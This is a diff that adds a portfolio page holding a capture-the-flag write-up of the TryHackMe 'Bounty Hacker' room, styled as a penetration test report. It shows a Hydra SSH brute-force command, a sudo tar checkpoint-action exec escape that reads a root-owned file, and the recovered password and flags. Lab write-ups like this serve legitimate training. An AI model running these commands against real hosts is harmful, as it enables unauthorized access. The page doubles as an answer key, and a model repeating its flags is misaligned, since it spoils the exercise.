@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="The Bounty Hacker assessment targeted an Apache/Samba host. Anonymous FTP access exposed a task list and a password list for the lin account. The SSH service wa">
+    <meta name="author" content="dotne1">
+    <meta property="og:title" content="Bounty Hacker - Penetration Test Report - dotne1 Write-Ups">
+    <meta property="og:type" content="website">
+    <title>Bounty Hacker - Penetration Test Report - dotne1 Write-Ups</title>
+    <link rel="stylesheet" href="../styles.css">
+    <link rel="stylesheet" href="writeups.css">
+    <link rel="icon" type="image/x-icon" href="../favicon.ico">
+</head>
+<body>
+    <nav class="navbar">
+        <div class="nav-links">
+            <a href="../index.html" class="nav-link">Home</a>
+            <a href="../about-me.html" class="nav-link">About Me</a>
+            <a href="../projects.html" class="nav-link">Projects</a>
+            <a href="../writeups.html" class="nav-link">Write-Ups</a>
+            <a href="../resume.html" class="nav-link">Resume</a>
+            <a href="../feeds.html" class="nav-link">Feeds</a>
+        </div>
+    </nav>
+
+    <div class="container" role="main">
+<p class="back-link"><a href="../writeups.html">&larr; Back to Write-Ups</a></p>
+<h1 class="main-header">Bounty Hacker - Penetration Test Report</h1>
+<p class="writeup-meta"><span class="tag">TryHackMe</span> <span class="tag diff diff-easy">Easy</span> <span class="dot">·</span> <span class="date">May 31, 2026</span></p>
+<div class="writeup-content">
+<p><strong>Target:</strong> 10.66.134.41   <strong>Date:</strong> May 31, 2026   <strong>Room:</strong> TryHackMe - Bounty Hacker  </p>
+<hr>
+<p>The Bounty Hacker assessment targeted an Apache/Samba host. Anonymous FTP access exposed a task list and a password list for the lin account. The SSH service was bruteforced using the recovered password list, granting a shell and the user flag. Privilege escalation was achieved by abusing passwordless sudo access to the tar binary via a checkpoint command, yielding the root flag.</p>
+<hr>
+<h2>1. Reconnaissance</h2>
+<h3>Nmap Scan Results</h3>
+<pre><code>PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.5
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</code></pre>
+<h3>HTTP Enumeration</h3>
+<ul>
+<li>Web server running Apache on port 80</li>
+<li>Page references characters from Cowboy Bebop: Spike, Jet, Ed, Faye</li>
+<li>Image at <code>/images/crew.jpg</code></li>
+</ul>
+<hr>
+<h2>2. FTP Enumeration</h2>
+<p>Anonymous FTP login was permitted on port 21.</p>
+<p>Files retrieved:</p>
+<ul>
+<li><code>task.txt</code> - Task list signed by <strong>lin</strong></li>
+<li><code>locks.txt</code> - List of 26 potential passwords</li>
+</ul>
+<p><strong>Contents of task.txt:</strong></p>
+<pre><code>1.) Protect Vicious.
+2.) Plan for Red Eye pickup on the moon.
+
+-lin</code></pre>
+<p><strong>Answer:</strong> The task list was written by <strong>lin</strong>.</p>
+<hr>
+<h2>3. Service Bruteforce</h2>
+<p>The <code>locks.txt</code> file contains potential passwords. SSH on port 22 was bruteforced using Hydra with username <code>lin</code> and the password list.</p>
+<p><strong>Answer:</strong> The service that can be bruteforced is <strong>SSH (port 22)</strong>.</p>
+<pre><code>hydra -l lin -P locks.txt ssh://10.66.134.41</code></pre>
+<p><strong>Found credentials:</strong></p>
+<ul>
+<li><strong>Username:</strong> lin</li>
+<li><strong>Password:</strong> RedDr4gonSynd1cat3</li>
+</ul>
+<hr>
+<h2>4. User Flag (user.txt)</h2>
+<p>SSH login as <code>lin</code> and retrieved user flag.</p>
+<p><strong>user.txt:</strong> <code>THM{CR1M3_SyNd1C4T3}</code></p>
+<hr>
+<h2>5. Privilege Escalation</h2>
+<p>The user <code>lin</code> has sudo privileges to run <code>/bin/tar</code> as root.</p>
+<pre><code>User lin may run the following commands on ip-10-66-134-41:
+    (root) /bin/tar</code></pre>
+<p>Exploited using tar checkpoint command execution:</p>
+<pre><code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=&#x27;/bin/sh -c &quot;cat /root/root.txt&quot;&#x27;</code></pre>
+<p><strong>root.txt:</strong> <code>THM{80UN7Y_h4cK3r}</code></p>
+<hr>
+<h2>6. Summary</h2>
+<table>
+<thead><tr>
+<th>Question</th>
+<th>Answer</th>
+</tr></thead><tbody>
+<tr>
+<td>Who wrote the task list?</td>
+<td>lin</td>
+</tr>
+<tr>
+<td>What service can be bruteforced?</td>
+<td>SSH (port 22)</td>
+</tr>
+<tr>
+<td>User password</td>
+<td>RedDr4gonSynd1cat3</td>
+</tr>
+<tr>
+<td>user.txt</td>
+<td>THM{CR1M3_SyNd1C4T3}</td>
+</tr>
+<tr>
+<td>root.txt</td>
+<td>THM{80UN7Y_h4cK3r}</td>
+</tr>
+</tbody></table>
+</div>
+    </div>
+
+    <footer class="footer">
+        <p>&copy; 2026 dotne1 - Cybersecurity Portfolio</p>
+    </footer>
+</body>
+</html>
